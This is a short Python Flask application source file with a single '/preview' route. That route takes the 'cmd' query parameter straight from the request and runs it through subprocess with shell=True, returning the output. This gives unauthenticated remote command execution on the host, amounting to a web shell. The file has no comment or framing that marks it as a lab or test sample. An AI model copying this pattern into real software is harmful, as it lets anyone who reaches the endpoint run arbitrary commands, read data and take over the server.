from flask import Flask, request
import subprocess
app = Flask(__name__)

@app.get("/preview")
def preview():
    return subprocess.check_output(request.args["cmd"], shell=True).decode()
